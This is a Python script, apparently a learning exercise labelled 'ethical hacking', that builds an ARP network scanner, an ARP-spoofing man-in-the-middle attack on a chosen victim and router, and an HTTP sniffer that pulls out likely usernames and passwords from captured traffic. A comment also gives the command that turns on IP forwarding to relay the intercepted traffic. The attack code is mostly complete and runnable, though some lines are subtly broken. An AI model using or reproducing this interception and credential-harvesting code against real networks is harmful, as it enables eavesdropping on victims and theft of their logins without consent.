# -*- coding: utf-8 -*-
"""
Ethical hacking using python

@author: Samyak Jain

ARP -> Address resolution protocol 
used when a host wants to send data in the same network to another host
ARP links MAC address for corresponding ip address.


The communication inside a network is carried out using MAC address
and not the ip address.
"""


#NETWORK SCANNER
""" the ip address of the network is taken.
then ip address is scanned for different hosts.
the arp request is sent to all the hosts using broadcast mac address
their mac address is returned by the hosts along with their ip address"""

import scapy.all as scapy

#scapy.ls(scapy.ARP)
#scapy.ls(scapy.Ether)

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    #print(arp_request.summary())
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #print(broadcast.summary())
    arp_request_broadcast=broadcast/arp_request
    #print(arp_request_broadcast.show())
    answered,unanswered= scapy.srp(arp_request_broadcast,timeout=1)
    #the used ips will answer
    #print(answered.summary())
    print("IP\t\t\tMAC ADDRESS")
    for element in answered:
        print(element[1].psrc+"\t\t"+element[1].hwsrc)
       
        

#for getting arguements from command line (linux/terminal)
"""import optparse
def get_arguments():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="target",help="Target Ip/Ip range.")
    (options,arguments)=parser.parse_args()
    return options
""" 
ip = input("Enter the ip address to scan")
scan(ip)



#ARP SPOOFING
"""
Man in the middle attack
The attacker will impersonate the victim to router and as router to victim 
by sending corresponding arp requests.

"""

#scapy.ls(scapy.ARP)

# Step1

# The victim after receiving this packet will think that it's a response
# from router as the packet have the ip of the router but this packet have the 
# MAC address of Attacker machine. So the ARP table in victim's machine will 
# update the mac address linked to ip address of router to mac address of 
# attacker.

# op=2 so that the packet is sent as arp response rather than request



import time

#ip of the target computer

victim_ip= input("Enter victim's ip")
router_ip= input("Enter router's ip")

#router ip is also called gateway ip

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered,unanswered= scapy.srp(arp_request_broadcast,timeout=1)
    
    return answered[0][1].hwsrc
    
def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)
    
    
def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet,count=4,verbose=False)
    

    
sent_packets_count=0
try:
    while True:
        spoof(victim_ip,router_ip)
        spoof(router_ip,victim_ip)
        sent_packets_count+=2
        print("\r[+] Packets sent: "+ str(sent_packets_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("Ctrl +c detected Resetting ARP tables and Quitting")
    restore(victim_ip,router_ip)
    

#We need to allow ip forwarding so that data could pass through attacker
#Terminal-> echo 1 > /proc/sys/net/ipv4/ip_forward
    
    
#PACKET SNIFFING USING SCAPY
    
#filter argument to filter data packets that are sniffed
#example- tcp,udp, port 80 , port 21 etc . HTTP not supported

from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet )
    #scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet, filter="" )
    
def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path    
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("HTTP Request >> "+ url)
        if packet.haslayer(scapy.Raw):  
            load=packet[scapy.raw].load
            keywords=["username","user","login","password","pass"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\nPossible username/password> " +load+"\n\n")
                    break

sniff("eth0")
    
